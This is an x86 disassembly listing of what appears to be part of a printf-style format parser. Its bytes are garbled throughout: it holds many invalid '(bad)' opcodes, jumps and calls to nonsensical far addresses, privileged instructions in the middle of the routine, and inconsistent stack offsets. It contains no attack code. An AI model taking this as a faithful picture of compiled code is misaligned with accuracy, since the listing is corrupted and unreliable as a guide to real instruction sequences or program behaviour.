  40732c:	eb bb                	jmp    0x4072e9
  40732e:	80 3f 2a             	cmpb   $0x2a,(%edi)
  407331:	75 36                	jne    0x407369
  407333:	8b 03                	mov    (%ebx),%eax
  407335:	83 c3 52             	add    $0x52,%ebx
  407338:	47                   	inc    %edi
  407339:	33 c9                	xor    %ecx,%ecx
  40733b:	81 c2 0f 84 c1 49    	add    $0x49c1840f,%edx
  407341:	23 c8                	and    %eax,%ecx
  407343:	89 b5 d6 89 7d 10    	mov    %esi,0x107d89d6(%ebp)
  407349:	6a 87                	push   $0xffffff87
  40734b:	68 e6 f4 ac 3c       	push   $0x3cacf4e6
  407350:	57                   	push   %edi
  407351:	c9                   	leave
  407352:	15 34 c1 26 00       	adc    $0x26c134,%eax
  407357:	83 c4 0c             	add    $0xc,%esp
  40735a:	85 c0                	test   %eax,%eax
  40735c:	74 37                	je     0x407395
  40735e:	8a d1                	mov    %cl,%dl
  407360:	e9 71 75 12 33       	jmp    0x3352e8d6
  407365:	c0 6b eb 31          	shrb   $0x31,-0x15(%ebx)
  407369:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40736c:	de db                	(bad)
  40736e:	89 55 b5             	mov    %edx,-0x4b(%ebp)
  407371:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  407374:	eb d3                	jmp    0x407349
  407376:	3c 6c                	cmp    $0x6c,%al
  407378:	75 9a                	jne    0x407314
  40737a:	b8 01 00 00 00       	mov    $0x1,%eax
  40737f:	47                   	inc    %edi
  407380:	21 18                	and    %ebx,(%eax)
  407382:	3c 1f                	cmp    $0x1f,%al
  407384:	75 68                	jne    0x4073ee
  407386:	b8 02 00 00 00       	mov    $0x2,%eax
  40738b:	47                   	inc    %edi
  40738c:	eb e4                	jmp    0x407372
  40738e:	b8 03 00 00 00       	mov    $0x3,%eax
  407393:	f2 52                	repnz push %edx
  407395:	1a 2f                	sbb    (%edi),%ch
  407397:	83 c7 03             	add    $0x3,%edi
  40739a:	6b 7d 10 8b          	imul   $0xffffff8b,0x10(%ebp),%edi
  40739e:	1b 30                	sbb    (%eax),%esi
  4073a0:	8a 0a                	mov    (%edx),%cl
  4073a2:	0a be f9 b4 ff 78    	or     0x78ffb4f9(%esi),%bh
  4073a8:	8e e8                	mov    %eax,%gs
  4073aa:	dd 06                	fldl   (%esi)
  4073ac:	00 00                	add    %al,(%eax)
  4073ae:	6a d2                	push   $0xffffffd2
  4073b0:	8a 97 04 7c 40 3c    	mov    0x3c407c04(%edi),%dl
  4073b6:	65 24 95             	gs and $0x95,%al
  4073b9:	d0 22                	shlb   $1,(%edx)
  4073bb:	40                   	inc    %eax
  4073bc:	00 85 2d 75 22 8b    	add    %al,-0x74dd8ad3(%ebp)
  4073c2:	20 04 8d 1d fc 8b 03 	and    %al,0x38bfc1d(,%ecx,4)
  4073c9:	d6                   	salc
  4073ca:	8d 55 ac             	lea    -0x54(%ebp),%edx
  4073cd:	83 c3 08             	add    $0x8,%ebx
  4073d0:	52                   	push   %edx
  4073d1:	8d 55 d0             	lea    -0x30(%ebp),%edx
  4073d4:	52                   	push   %edx
  4073d5:	6a 01                	push   $0x1
  4073d7:	51                   	push   %ecx
  4073d8:	50                   	push   %eax
  4073d9:	a0 72 0d 00 00       	mov    0xd72,%al
  4073de:	83 eb a2             	sub    $0xffffffa2,%ebx
  4073e1:	eb 34                	jmp    0x407417
  4073e3:	83 f8 01             	cmp    $0x1,%eax
  4073e6:	74 10                	je     0x4073f8
  4073e8:	e9 95 02 75 d5       	jmp    0xd5b57682
  4073ed:	83 c3 04             	add    $0x4,%ebx
  4073f0:	33 f8                	xor    %eax,%edi
  4073f2:	66 8b 43 cb          	mov    -0x35(%ebx),%ax
  4073f6:	eb 05                	jmp    0x4073fd
  4073f8:	8b 03                	mov    (%ebx),%eax
  4073fa:	83 c3 80             	add    $0xffffff80,%ebx
  4073fd:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  407400:	8d 55 ac             	lea    -0x54(%ebp),%edx
  407403:	51                   	push   %ecx
  407404:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  407407:	52                   	push   %edx
  407408:	51                   	push   %ecx
  407409:	6a 01                	push   $0x1
  40740b:	50                   	push   %eax
  40740c:	e8 45 d8 e8 dc       	call   0xdd294c56
  407411:	0c 00                	or     $0x0,%al
  407413:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  407414:	83 c4 14             	add    $0x14,%esp
  407417:	8b 57 8b             	mov    -0x75(%edi),%edx
  40741a:	45                   	inc    %ebp
  40741b:	e4 85                	in     $0x85,%al
  40741d:	c0 0f 62             	rorb   $0x62,(%edi)
  407420:	bb 03 00 00 8b       	mov    $0x8b000003,%ebx
  407425:	9b                   	fwait
  407426:	f0 8d 50 01          	lock lea 0x1(%eax),%edx
  40742a:	c7                   	(bad)
  40742b:	fa                   	cli
  40742c:	94                   	xchg   %eax,%esp
  40742d:	02 00                	add    (%eax),%al
  40742f:	00 72 05             	add    %dh,0x5(%edx)
  407432:	64 ff 01             	incl   %fs:(%ecx)
  407435:	00 00                	add    %al,(%eax)
  407437:	39 45 5b             	cmp    %eax,0x5b(%ebp)
  40743a:	e0 83                	loopne 0x4073bf
  40743c:	12 03                	adc    (%ebx),%al
  40743e:	00 00                	add    %al,(%eax)
  407440:	24 c6                	and    $0xc6,%al
  407442:	06                   	push   %es
  407443:	30 8b 4d dd 41 3b    	xor    %cl,0x3b41dd4d(%ebx)
  407449:	c8 e4 9a fc          	enter  $0x9ae4,$0xfc
  40744d:	29 f1                	sub    %esi,%ecx
  40744f:	e9 8b 13 00 3c       	jmp    0x3c4087df
  407454:	85 43 75             	test   %eax,0x75(%ebx)
  407457:	22 8b e5 04 8d 55    	and    0x558d04e5(%ebx),%cl
  40745d:	fc                   	cld
  40745e:	8b 03                	mov    (%ebx),%eax
  407460:	52                   	push   %edx
  407461:	8d 55 ac             	lea    -0x54(%ebp),%edx
  407464:	83 c3 08             	add    $0x8,%ebx
  407467:	52                   	push   %edx
  407468:	8d b4 d0 ee 6a 00 51 	lea    0x51006aee(%eax,%edx,8),%esi
  40746f:	50                   	push   %eax
  407470:	c6                   	(bad)
  407471:	7b 0c                	jnp    0x40747f
  407473:	00 00                	add    %al,(%eax)
  407475:	83 16 fe             	adcl   $0xfffffffe,(%esi)
  407478:	eb 51                	jmp    0x4074cb
  40747a:	83 1b 01             	sbbl   $0x1,(%ebx)
  40747d:	1d 0d 83 f8 02       	sbb    $0x2f8830d,%eax
  407482:	64 08 0f             	or     %cl,%fs:(%edi)
  407485:	bf 03 7f c1 04       	mov    $0x4c17f03,%edi
  40748a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40748b:	05 8b 03 83 c3       	add    $0xc383038b,%eax
  407490:	04 c4                	add    $0xc4,%al
  407492:	1d fc 8f 55 ac       	sbb    $0xac558ffc,%eax
  407497:	51                   	push   %ecx
  407498:	8d                   	lea    (bad),%edi
  407499:	f9                   	stc
  40749a:	d0 52 44             	rclb   $1,0x44(%edx)
  40749d:	23 00                	and    (%eax),%eax
  40749f:	50                   	push   %eax
  4074a0:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4074a3:	e8 48 ea 00 00       	call   0x415ef0
  4074a8:	83 c4 14             	add    $0x14,%esp
  4074ab:	8b a9 8b 45 bf 85    	mov    -0x7a40ba75(%ecx),%ebp
  4074b1:	c0 74 8d 8b 45       	shlb   $0x45,-0x75(%ebp,%ecx,4)
  4074b6:	11 8d 50 01 81 fa    	adc    %ecx,-0x57efeb0(%ebp)
  4074bc:	ad                   	lods   %ds:(%esi),%eax
  4074bd:	02 00                	add    (%eax),%al
  4074bf:	00 72 05             	add    %dh,0x5(%edx)
  4074c2:	b8 c9 0a 00 00       	mov    $0xac9,%eax
  4074c7:	39 4b 6c             	cmp    %ecx,0x6c(%ebx)
  4074ca:	73 5b                	jae    0x407527
  4074cc:	4e                   	dec    %esi
  4074cd:	c6                   	(bad)
  4074ce:	a1 30 8b 4d fc       	mov    0xfc4d8b30,%eax
  4074d3:	41                   	inc    %ecx
  4074d4:	3b c8                	cmp    %eax,%ecx
  4074d6:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4074d9:	72 f1                	jb     0x4074cc
  4074db:	8b f2                	mov    %edx,%esi
  4074dd:	d0 85 c0 0f 84 db    	rolb   $1,-0x247bf040(%ebp)
  4074e3:	01 00                	add    %eax,(%eax)
  4074e5:	00 c6                	add    %al,%dh
  4074e7:	45                   	inc    %ebp
  4074e8:	fb                   	sti
  4074e9:	2d e9 d4 02 00       	sub    $0x2d4e9,%eax
  4074ee:	00 85 c0 75 1f 8b    	add    %al,-0x74e08a40(%ebp)
  4074f4:	53                   	push   %ebx
  4074f5:	04 8b                	add    $0x8b,%al
  4074f7:	03 8d 75 fc 69 c3    	add    -0x3c96038b(%ebp),%ecx
  4074fd:	08 56 8d             	or     %dl,-0x73(%esi)
  407500:	75 ac                	jne    0x4074ae
  407502:	56                   	push   %esi
  407503:	51                   	push   %ecx
  407504:	37                   	aaa
  407505:	03 52 50             	add    0x50(%edx),%edx
  407508:	e8 d3 10 00 3f       	call   0x3f4085e0
  40750d:	17                   	pop    %ss
  40750e:	c4 65 eb             	les    -0x15(%ebp),%esp
  407511:	2e f4                	cs hlt
  407513:	99                   	cltd
  407514:	01 74 64 83          	add    %esi,-0x7d(%esp,%eiz,2)
  407518:	e3 02                	jecxz  0x40751c
  40751a:	75 0b                	jne    0x407527
  40751c:	83 c3 19             	add    $0x19,%ebx
  40751f:	33 c0                	xor    %eax,%eax
  407521:	66 54                	push   %sp
  407523:	43                   	inc    %ebx
  407524:	c0 e9 28             	shr    $0x28,%cl
  407527:	8b 03                	mov    (%ebx),%eax
  407529:	83 c3 4e             	add    $0x4e,%ebx
  40752c:	8d 55 8d             	lea    -0x73(%ebp),%edx
  40752f:	52                   	push   %edx
  407530:	99                   	cltd
  407531:	55                   	push   %ebp
  407532:	ac                   	lods   %ds:(%esi),%al
  407533:	9e                   	sahf
  407534:	51                   	push   %ecx
  407535:	6a 03                	push   $0x3
  407537:	50                   	push   %eax
  407538:	e8 fe b2 00 f2       	call   0xf241283b
  40753d:	83 c4 f6             	add    $0xfffffff6,%esp
  407540:	45                   	inc    %ebp
  407541:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407542:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  407545:	2f                   	das
  407546:	c0 74 27 8b 45       	shlb   $0x45,-0x75(%edi,%eiz,1)
  40754b:	f0 8d 48 01          	lock lea 0x1(%eax),%ecx
  40754f:	81 f9 00 02 00 00    	cmp    $0x200,%ecx
  407555:	17                   	pop    %ss
  407556:	05 b8 2b 01 00       	add    $0x12bb8,%eax
  40755b:	00 39                	add    %bh,(%ecx)
  40755d:	45                   	inc    %ebp
  40755e:	fc                   	cld
  40755f:	73 0f                	jae    0x407570
  407561:	c7 c6 06 30 8b 4d    	mov    $0x4d8b3006,%esi
  407567:	fc                   	cld
  407568:	41                   	inc    %ecx
  407569:	3b c8                	cmp    %eax,%ecx
  40756b:	89 ec                	mov    %ebp,%esp
  40756d:	fc                   	cld
  40756e:	72 f1                	jb     0x407561
  407570:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  407573:	85 c0                	test   %eax,%eax
  407575:	0f 24 64             	mov    %tr4,%esp
  407578:	fa                   	cli
  407579:	00 8d 80 3e 30 0f    	add    %cl,0xf303e80(%ebp)
  40757f:	84 5b 02             	test   %bl,0x2(%ebx)
  407582:	00 00                	add    %al,(%eax)
  407584:	71 34                	jno    0x4075ba
  407586:	fb                   	sti
  407587:	30 46 61             	xor    %al,0x61(%esi)
  40758a:	cb                   	lret
  40758b:	00 dd                	add    %bl,%ch
  40758d:	85 0f                	test   %ecx,(%edi)
  40758f:	00 95 8b 7a 04 8b    	add    %dl,-0x74fb8575(%ebp)
  407595:	03 8d 75 fc 83 71    	add    0x7183fc75(%ebp),%ecx
  40759b:	08 56 8d             	or     %dl,-0x73(%esi)
  40759e:	75 ac                	jne    0x40754c
  4075a0:	56                   	push   %esi
  4075a1:	51                   	push   %ecx
  4075a2:	6a 04                	push   $0x4
  4075a4:	52                   	push   %edx
  4075a5:	c5 2f                	lds    (%edi),%ebp
  4075a7:	35 10 49 15 83       	xor    $0x83154910,%eax
  4075ac:	c4 18                	les    (%eax),%ebx
  4075ae:	eb 2e                	jmp    0x4075de
  4075b0:	63 f8                	arpl   %edi,%eax
  4075b2:	01 74 10 83          	add    %esi,-0x7d(%eax,%edx,1)
  4075b6:	f8                   	clc
  4075b7:	02 75 0b             	add    0xb(%ebp),%dh
  4075ba:	6c                   	insb   (%dx),%es:(%edi)
  4075bb:	c3                   	ret
  4075bc:	04 33                	add    $0x33,%al
  4075be:	c0 66 97 43          	shlb   $0x43,-0x69(%esi)
  4075c2:	fc                   	cld
  4075c3:	72 05                	jb     0x4075ca
  4075c5:	8b 03                	mov    (%ebx),%eax
  4075c7:	18 80 04 8d 55 fc    	sbb    %al,-0x3aa72fc(%eax)
  4075cd:	52                   	push   %edx
  4075ce:	8d 55 ac             	lea    -0x54(%ebp),%edx
  4075d1:	52                   	push   %edx
  4075d2:	51                   	push   %ecx
  4075d3:	52                   	push   %edx
  4075d4:	04 50                	add    $0x50,%al
  4075d6:	e8 b5 0f 00 00       	call   0x408590
  4075db:	83 c4 c9             	add    $0xffffffc9,%esp
  4075de:	8b f0                	mov    %eax,%esi
  4075e0:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4075e3:	85 c0                	test   %eax,%eax
  4075e5:	74 27                	je     0x40760e
  4075e7:	d0 45 f0             	rolb   $1,-0x10(%ebp)
  4075ea:	83 48 01 81          	orl    $0xffffff81,0x1(%eax)
  4075ee:	f9                   	stc
  4075ef:	db 02                	fildl  (%edx)
  4075f1:	00 46 72             	add    %al,0x72(%esi)
  4075f4:	93                   	xchg   %eax,%ebx
  4075f5:	30 a7 01 00 00 39    	xor    %ah,0x39000001(%edi)
  4075fb:	45                   	inc    %ebp
  4075fc:	fc                   	cld
  4075fd:	59                   	pop    %ecx
  4075fe:	0f 4e c6             	cmovle %esi,%eax
  407601:	06                   	push   %es
  407602:	30 8b a9 4d 41 3b    	xor    %cl,0x3b414da9(%ebx)
  407608:	c8 e3 4d 0e          	enter  $0x4de3,$0xe
  40760c:	72 f1                	jb     0x4075ff
  40760e:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  407611:	85 c0                	test   %eax,%eax
  407613:	0f 84 c6 57 00 00    	je     0x40cddf
  407619:	8b 45 cf             	mov    -0x31(%ebp),%eax
  40761c:	85 c0                	test   %eax,%eax
  40761e:	1a 84 a6 01 85 00 8b 	sbb    -0x74ff7aff(%esi,%eiz,4),%al
  407625:	55                   	push   %ebp
  407626:	10 4e 4e             	adc    %cl,0x4e(%esi)
  407629:	8a 02                	mov    (%edx),%al
  40762b:	88 46 01             	mov    %al,0x1(%esi)
  40762e:	39 06                	cmp    %eax,(%esi)
  407630:	30 8b 45 fc 83 c0    	xor    %cl,-0x3f7c03bb(%ebx)
  407636:	02 e9                	add    %cl,%ch
  407638:	a0 01 c1 00 8b       	mov    0x8b00c101,%al
  40763d:	33 83 c3 04 72 f6    	xor    -0x98dfb3d(%ebx),%eax
  407643:	0f 84 c8 03 39 00    	je     0x797a11
  407649:	8b c2                	mov    %edx,%eax
  40764b:	e4 bf                	in     $0xbf,%al
  40764d:	c5 75 18             	lds    0x18(%ebp),%esi
  407650:	8b fe                	mov    %esi,%edi
  407652:	83 c9 ff             	or     $0xffffffff,%ecx
  407655:	41                   	inc    %ecx
  407656:	83 c6 c8             	add    $0xffffffc8,%esi
  407659:	17                   	pop    %ss
  40765a:	20 f2                	and    %dh,%dl
  40765c:	ae                   	scas   %es:(%edi),%al
  40765d:	f7 49 72 89 2e fc 08 	testl  $0x8fc2e89,0x72(%ecx)
  407664:	77 01                	ja     0x407667
  407666:	00 00                	add    %al,(%eax)
  407668:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40766b:	33 3d 85 c9 8b 11    	xor    0x118bc985,%edi
  407671:	89 55 e1             	mov    %edx,-0x1f(%ebp)
  407674:	0f 86 a3 18 17 da    	jbe    0xda578f1d
  40767a:	80 38 00             	cmpb   $0x0,(%eax)
  40767d:	0f 84 c4 36 00 49    	je     0x4940ad47
  407683:	6b 42 3b d1          	imul   $0xffffffd1,0x3b(%edx),%eax
  407687:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40768a:	fc                   	cld
  40768b:	ee                   	out    %al,(%dx)
  40768c:	c6 45 17 20          	movb   $0x20,0x17(%ebp)
  407690:	e9 4a 04 27 00       	jmp    0x677adf
  407695:	dd 03                	fldl   (%ebx)
  407697:	8b 45 3f             	mov    0x3f(%ebp),%eax
  40769a:	83 1f 0c             	sbbl   $0xc,(%edi)
  40769d:	dd 5d 5a             	fstpl  0x5a(%ebp)
  4076a0:	85 c0                	test   %eax,%eax
  4076a2:	b8 26 00 9a fa       	mov    $0xfa9a0026,%eax
  4076a7:	74 03                	je     0x4076ac
  4076a9:	8b 45 65             	mov    0x65(%ebp),%eax
  4076ac:	8d 55 b3             	lea    -0x4d(%ebp),%edx
  4076af:	52                   	push   %edx
  4076b0:	8d 95 76 fd ff 6e    	lea    0x6efffd76(%ebp),%edx
  4076b6:	52                   	push   %edx
  4076b7:	8d 55 d0             	lea    -0x30(%ebp),%edx
  4076ba:	b5 a1                	mov    $0xa1,%ch
  4076bc:	ac                   	lods   %ds:(%esi),%al
  4076bd:	d7                   	xlat   %ds:(%ebx)
  4076be:	50                   	push   %eax
  4076bf:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4076c2:	05 8b 45 b4 52       	add    $0x52b4458b,%eax
  4076c7:	50                   	push   %eax
  4076c8:	51                   	push   %ecx
  4076c9:	e8 95 0c 8b 00       	call   0xcb8363
  4076ce:	84 fb                	test   %bh,%bl
  4076d0:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4076d3:	83 c4 20             	add    $0x20,%esp
  4076d6:	85 c0                	test   %eax,%eax
  4076d8:	f9                   	stc
  4076d9:	09 c6                	or     %eax,%esi
  4076db:	ea fb 2d e9 e0 00 00 	ljmp   $0x0,$0xe0e92dfb
  4076e2:	00 8b 45 17 85 c0    	add    %cl,-0x3f7ae8bb(%ebx)
  4076e8:	74 09                	je     0x4076f3
  4076ea:	c6 45 fb 2b          	movb   $0x2b,-0x5(%ebp)
  4076ee:	e9 d0 00 bc fb       	jmp    0xfbfc77c3
  4076f3:	e2 45                	loop   0x40773a
  4076f5:	c8 85 c0 0f          	enter  $0xc085,$0xf
  4076f9:	84 e1                	test   %ah,%cl
  4076fb:	00 00                	add    %al,(%eax)
  4076fd:	cb                   	lret
  4076fe:	c6                   	(bad)
  4076ff:	25 df 20 31 bc       	and    $0xbc3120df,%eax
  407704:	00 00                	add    %al,(%eax)
  407706:	00 8b 45 e4 85 c0    	add    %cl,-0x3f7a1bbb(%ebx)
  40770c:	04 07                	add    $0x7,%al
  40770e:	b8 9a 00 00 00       	mov    $0x9a,%eax
  407713:	eb 80                	jmp    0x407695
  407715:	8b 6a f0             	mov    -0x10(%edx),%ebp
  407718:	85 c0                	test   %eax,%eax
  40771a:	7f 08                	jg     0x407724
  40771c:	b8 01 00 00 b1       	mov    $0xb1000001,%eax
  407721:	89 d2                	mov    %edx,%edx
  407723:	f0 8b d0             	lock mov %eax,%edx
  407726:	d4 8d                	aam    $0x8d
  407728:	95                   	xchg   %eax,%ebp
  407729:	ad                   	lods   %ds:(%esi),%eax
  40772a:	fd                   	std
  40772b:	ff                   	(bad)
  40772c:	ff                   	lcall  (bad)
  40772d:	dd 03                	fldl   (%ebx)
  40772f:	51                   	push   %ecx
  407730:	83 c3 08             	add    $0x8,%ebx
  407733:	52                   	push   %edx
  407734:	50                   	push   %eax
  407735:	83 ec 08             	sub    $0x8,%esp
  407738:	dd 0f                	fisttpll (%edi)
  40773a:	7a 6d                	jp     0x4077a9
  40773c:	e0 05                	loopne 0x407743
  40773e:	00 00                	add    %al,(%eax)
  407740:	8b f0                	mov    %eax,%esi
  407742:	ba c4 14 80 45       	mov    $0x458014c4,%edx
  407747:	2d 75 07 c6 45       	sub    $0x45c60775,%eax
  40774c:	fb                   	sti
  40774d:	8e fe                	mov    %esi,%?
  40774f:	eb 18                	jmp    0x407769
  407751:	8b 45 ca             	mov    -0x36(%ebp),%eax
  407754:	85 c0                	test   %eax,%eax
  407756:	74 95                	je     0x4076ed
  407758:	c6 45 fb 6d          	movb   $0x6d,-0x5(%ebp)
  40775c:	eb 0b                	jmp    0x407769
  40775e:	8b a8 c8 85 6f 74    	mov    0x746f85c8(%eax),%ebp
  407764:	04 c6                	add    $0xc6,%al
  407766:	45                   	inc    %ebp
  407767:	fb                   	sti
  407768:	20 8b fe 83 ad ff    	and    %cl,-0x527c02(%ebx)
  40776e:	8c c0                	mov    %es,%eax
  407770:	72 ae                	jb     0x407720
  407772:	8b 53 d4             	mov    -0x2c(%ebx),%edx
  407775:	f7 d1                	not    %ecx
  407777:	a3 85 6b 89 4d       	mov    %eax,0x4d896b85
  40777c:	fc                   	cld
  40777d:	ce                   	into
  40777e:	22 47 2e             	and    0x2e(%edi),%al
  407781:	56                   	push   %esi
  407782:	ff 15 7c c1 40 00    	call   *0x40c17c
  407788:	83 e9 08             	sub    $0x8,%ecx
  40778b:	85 0c 75 7e 8b 57 fc 	test   %ecx,-0x3a87482(,%esi,2)
  407792:	c6                   	(bad)
  407793:	97                   	xchg   %eax,%edi
  407794:	b1 f9                	mov    $0xf9,%cl
  407796:	8b b1 fc 1b 89 45    	mov    0x45891bfc(%ecx),%esi
  40779c:	fc                   	cld
  40779d:	5e                   	pop    %esi
  40779e:	04 16                	add    $0x16,%al
  4077a0:	47                   	inc    %edi
  4077a1:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4077a4:	80 02 47             	addb   $0x47,(%edx)
  4077a7:	75 13                	jne    0x4077bc
  4077a9:	4f                   	dec    %edi
  4077aa:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4077ab:	56                   	push   %esi
  4077ac:	eb 15                	jmp    0x4077c3
  4077ae:	7c a0                	jl     0x407750
  4077b0:	40                   	inc    %eax
  4077b1:	00 83 c4 08 85 d3    	add    %al,-0x2c7af73c(%ebx)
  4077b7:	74 de                	je     0x407797
  4077b9:	2c 00                	sub    $0x0,%al
  4077bb:	45                   	inc    %ebp
  4077bc:	8a 45 fb             	mov    -0x5(%ebp),%al
  4077bf:	57                   	push   %edi
  4077c0:	c0 74 1c 81 fe       	shlb   $0xfe,-0x7f(%esp,%ebx,1)
  4077c5:	70 d3                	jo     0x40779a
  4077c7:	40                   	inc    %eax
  4077c8:	00 6d 14             	add    %ch,0x14(%ebp)
  4077cb:	8d 45 ea             	lea    -0x16(%ebp),%eax
  4077ce:	3b f0                	cmp    %eax,%esi
  4077d0:	26 0d 8a af fb 4e    	es or  $0x4efbaf8a,%eax
  4077d6:	88 0e                	mov    %cl,(%esi)
  4077d8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4077db:	2a 89 45 fc 8b b3    	sub    -0x4c7403bb(%ecx),%cl
  4077e1:	cc                   	int3
  4077e2:	85 c0                	test   %eax,%eax
  4077e4:	51                   	push   %ecx
  4077e5:	84 01                	test   %al,(%ecx)
  4077e7:	03 00                	add    (%eax),%eax
  4077e9:	00 83 7d c0 01 0f    	add    %al,0xf01c07d(%ebx)
  4077ef:	49                   	dec    %ecx
  4077f0:	f7 02 00 00 8b 55    	testl  $0x558b0000,(%edx)
  4077f6:	e0 8b                	loopne 0x407783
  4077f8:	45                   	inc    %ebp
  4077f9:	fc                   	cld
  4077fa:	3b 98 0f 86 e9 02    	cmp    0x2e9860f(%eax),%ebx
  407800:	00 00                	add    %al,(%eax)
  407802:	80 7d 17 30          	cmpb   $0x30,0x17(%ebp)
  407806:	0f 85 99 05 00 00    	jne    0x407da5
  40780c:	8a 45 5e             	mov    0x5e(%ebp),%al
  40780f:	84 c2                	test   %al,%dl
  407811:	0f 84 8e 02 24 00    	je     0x647aa5
  407817:	8b 45 80             	mov    -0x80(%ebp),%eax
  40781a:	8b 7d 9f             	mov    -0x61(%ebp),%edi
  40781d:	85 c0                	test   %eax,%eax
  40781f:	74 26                	je     0x407847
  407821:	3b 45 dc             	cmp    -0x24(%ebp),%eax
  407824:	72 19                	jb     0x40783f
  407826:	57                   	push   %edi
  407827:	89 03                	mov    %eax,(%ebx)
  407829:	00 5e 08             	add    %bl,0x8(%esi)
  40782c:	83 c4 25             	add    $0x25,%esp
  40782f:	85 c0                	test   %eax,%eax
  407831:	0f 55 8c 03 00 00 8b 	andnps 0x3f8b0000(%ebx,%eax,1),%xmm1
  407838:	3f 
  407839:	04 8b                	add    $0x8b,%al
  40783b:	07                   	pop    %es
  40783c:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  40783f:	86 16                	xchg   %dl,(%esi)
  407841:	88 10                	mov    %dl,(%eax)
  407843:	40                   	inc    %eax
  407844:	89 7f f4             	mov    %edi,-0xc(%edi)
  407847:	01 55 ec             	add    %edx,-0x14(%ebp)
  40784a:	8b 4d 04             	mov    0x4(%ebp),%ecx
  40784d:	42                   	inc    %edx
  40784e:	46                   	inc    %esi
  40784f:	89 55 08             	mov    %edx,0x8(%ebp)
  407852:	1c 55                	sbb    $0x55,%al
  407854:	fc                   	cld
  407855:	4a                   	dec    %edx
  407856:	31 70 55             	xor    %esi,0x55(%eax)
  407859:	44                   	inc    %esp
  40785a:	d0 4d e0             	rorb   $1,-0x20(%ebp)
  40785d:	02 49 02             	add    0x2(%ecx),%cl
  407860:	00 f6                	add    %dh,%dh
  407862:	95                   	xchg   %eax,%ebp
  407863:	66 35 c3 03          	xor    $0x3c3,%ax
  407867:	30 55 ea             	xor    %dl,-0x16(%ebp)
  40786a:	8d 75 ea             	lea    -0x16(%ebp),%esi
  40786d:	f7 45 fc 01 00 00 00 	testl  $0x1,-0x4(%ebp)
  407874:	c6 45 17 20          	movb   $0x20,0x17(%ebp)
  407878:	e9 62 5c 29 ff       	jmp    0xff69d4df
  40787d:	05 45 ea 25 8d       	add    $0x8d25ea45,%eax
  407882:	75 ea                	jne    0x40786e
  407884:	c7 45 81 01 00 00 00 	movl   $0x1,-0x7f(%ebp)
  40788b:	c6                   	(bad)
  40788c:	da 17                	ficoml (%edi)
  40788e:	9e                   	sahf
  40788f:	e9 4b ff bd d5       	jmp    0xd5fe77df
  407894:	83 cd 04             	or     $0x4,%ebp
  407897:	85 c0                	test   %eax,%eax
  407899:	75 e1                	jne    0x40787c
  40789b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40789e:	e1 4b                	loope  0x4078eb
  4078a0:	fc                   	cld
  4078a1:	6d                   	insl   (%dx),%es:(%edi)
  4078a2:	b8 01 c7 45 bc       	mov    $0xbc45c701,%eax
  4078a7:	00 de                	add    %bl,%dh
  4078a9:	17                   	pop    %ss
  4078aa:	00 3e                	add    %bh,(%esi)
  4078ac:	51                   	push   %ecx
  4078ad:	04 b9                	add    $0xb9,%al
  4078af:	f6 ff                	idiv   %bh
  4078b1:	ff 95 83 c2 01 75    	call   *0x7501c283(%ebp)
  4078b7:	14 3f                	adc    $0x3f,%al
  4078b9:	c0 1a 8b             	rcrb   $0x8b,(%edx)
  4078bc:	45                   	inc    %ebp
  4078bd:	ec                   	in     (%dx),%al
  4078be:	c7 45 bc 00 00 00 00 	movl   $0x0,-0x44(%ebp)
  4078c5:	89 02                	mov    %eax,(%edx)
  4078c7:	e9 13 ff ff ff       	jmp    0x4077df
  4078cc:	83 a2 02 75 98 8b 4b 	andl   $0x4b,-0x74678afe(%edx)
  4078d3:	fc                   	cld
  4078d4:	66 8b 55 ec          	mov    -0x14(%ebp),%dx
  4078d8:	c7 45 bc 00 00 00 00 	movl   $0x0,-0x44(%ebp)
  4078df:	66 be 35 e9          	mov    $0xe935,%si
  4078e3:	f8                   	clc
  4078e4:	fe                   	(bad)
  4078e5:	ff                   	(bad)
  4078e6:	ff 09                	decl   (%ecx)
  4078e8:	43                   	inc    %ebx
  4078e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4078ea:	9b                   	fwait
  4078eb:	4d                   	dec    %ebp
  4078ec:	ec                   	in     (%dx),%al
  4078ed:	c7                   	(bad)
  4078ee:	15 bc 00 00 00       	adc    $0xbc,%eax
  4078f3:	c8 89 08 e9          	enter  $0x889,$0xe9
  4078f7:	84 fe                	test   %bh,%dh
  4078f9:	ff                   	(bad)
  4078fa:	ff 8b 45 10 40 89    	decl   -0x76bfefbb(%ebx)
  407900:	45                   	inc    %ebp
  407901:	10 8a 00 0f be c8    	adc    %cl,-0x3741f100(%edx)
  407907:	38 f9                	cmp    %bh,%cl
  407909:	74 e9                	je     0x4078f4
  40790b:	87 63 01             	xchg   %esp,0x1(%ebx)
  40790e:	b1 00                	mov    $0x0,%cl
  407910:	33 d2                	xor    %edx,%edx
  407912:	27                   	daa
  407913:	91                   	xchg   %eax,%ecx
  407914:	1c 7c                	sbb    $0x7c,%al
  407916:	92                   	xchg   %eax,%edx
  407917:	7d 7f                	jge    0x407998
  407919:	9c                   	pushf
  40791a:	95                   	xchg   %eax,%ebp
  40791b:	80 7c 40 00 8b       	cmpb   $0x8b,0x0(%eax,%eax,2)
  407920:	03 e0                	add    %eax,%esp
  407922:	4d                   	dec    %ebp
  407923:	fc                   	cld
  407924:	83 c3 04             	add    $0x4,%ebx
  407927:	8d 55 ac             	lea    -0x54(%ebp),%edx
  40792a:	51                   	push   %ecx
  40792b:	52                   	push   %edx
  40792c:	6a 78                	push   $0x78
  40792e:	6a 04                	push   $0x4
  407930:	50                   	push   %eax
